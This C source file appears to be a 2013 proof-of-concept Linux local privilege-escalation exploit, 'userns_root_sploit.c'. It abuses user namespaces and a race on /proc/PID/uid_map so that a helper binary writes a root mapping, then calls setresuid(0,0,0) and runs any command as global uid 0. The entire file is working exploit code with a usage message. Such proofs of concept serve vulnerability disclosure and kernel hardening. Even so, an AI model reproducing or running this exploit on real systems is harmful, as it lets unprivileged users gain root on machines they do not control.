/* userns_root_sploit.c by */
/* Copyright (c) 2013 Andrew Lutomirski.  All rights reserved. */
/* You may use, modify, and redistribute this code under the GPLv2. */

#define _GNU_SOURCE
#include <unistd.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <err.h>
#include <linux/futex.h>
#include <errno.h>
#include <unistd.h>
#include <sys/syscall.h>

#ifndef CLONE_NEWUSER
#define CLONE_NEWUSER 0x10000000
#endif

pid_t parent;
int *ftx;

int childfn()
{
  int fd;
  char buf[128];

  if (syscall(SYS_futex, ftx, FUTEX_WAIT, 0, 0, 0, 0) == -1 &&
      errno != EWOULDBLOCK)
    err(1, "futex");

  sprintf(buf, "/proc/%ld/uid_map", (long)parent);
  fd = open(buf, O_RDWR | O_CLOEXEC);
  if (fd == -1)
    err(1, "open %s", buf);
  if (dup2(fd, 1) != 1)
    err(1, "dup2");

  // Write something like "0 0 1" to stdout with elevated capabilities.
  execl("./zerozeroone", "./zerozeroone");

  return 0;
}

int main(int argc, char **argv)
{
  int dummy, status;
  pid_t child;

  if (argc < 2) {
    printf("usage: userns_root_sploit COMMAND ARGS...\n\n"
           "This will run a command as (global) uid 0 but no capabilities.\n");
    return 1;
  }

  ftx = mmap(0, sizeof(int), PROT_READ | PROT_WRITE,
             MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (ftx == MAP_FAILED)
    err(1, "mmap");

  parent = getpid();

  if (signal(SIGCHLD, SIG_DFL) != 0)
    err(1, "signal");

  child = fork();
  if (child == -1)
    err(1, "fork");
  if (child == 0)
    return childfn();

  *ftx = 1;
  if (syscall(SYS_futex, ftx, FUTEX_WAKE, 1, 0, 0, 0) != 0)
    err(1, "futex");

  if (unshare(CLONE_NEWUSER) != 0)
    err(1, "unshare(CLONE_NEWUSER)");

  if (wait(&status) != child)
    err(1, "wait");
  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
    errx(1, "child failed");

  if (setresuid(0, 0, 0) != 0)
    err(1, "setresuid");
  execvp(argv[1], argv+1);
  err(1, argv[1]);

  return 0;
}